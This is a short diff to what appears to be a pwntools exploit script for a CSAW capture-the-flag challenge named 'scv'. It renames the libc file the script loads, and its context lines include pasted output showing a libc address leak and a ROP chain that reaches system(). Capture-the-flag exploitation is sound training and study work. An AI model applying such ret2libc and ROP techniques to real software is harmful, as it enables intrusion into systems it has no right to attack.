@@ -22,7 +22,7 @@ if args['GDB']:
 elif args['REMOTE']:
     io = remote('pwn.chal.csaw.io', 3764)
     elf = ELF('./scv')
-    libc = ELF('./libc-2.23.so')
+    libc = ELF('./libc-amd64-2.23-0ubuntu9.so')
 else:
     io = process('./scv')
     elf = io.elf
@@ -96,7 +96,7 @@ io.interactive()
 #     Stack:    Canary found
 #     NX:       NX enabled
 #     PIE:      No PIE (0x400000)
-# [*] '/home/ubuntu/vbox/libc-2.23.so'
+# [*] '/home/ubuntu/vbox/libc-amd64-2.23-0ubuntu9.so'
 #     Arch:     amd64-64-little
 #     RELRO:    Partial RELRO
 #     Stack:    Canary found
@@ -109,7 +109,7 @@ io.interactive()
 # 0x0010:         0x4008cc puts
 # 0x0018: '\x96\n@\x00\x00\x00\x00\x00' '\x96\n@\x00\x00\x00\x00\x00'
 # [*] libc address: 0x7f21b28f0000
-# [*] Loaded cached gadgets for './libc-2.23.so'
+# [*] Loaded cached gadgets for './libc-amd64-2.23-0ubuntu9.so'
 # 0x0000:   0x7f21b2911102 pop rdi; ret
 # 0x0008:   0x7f21b2a7cd17
 # 0x0010:   0x7f21b2935390 system
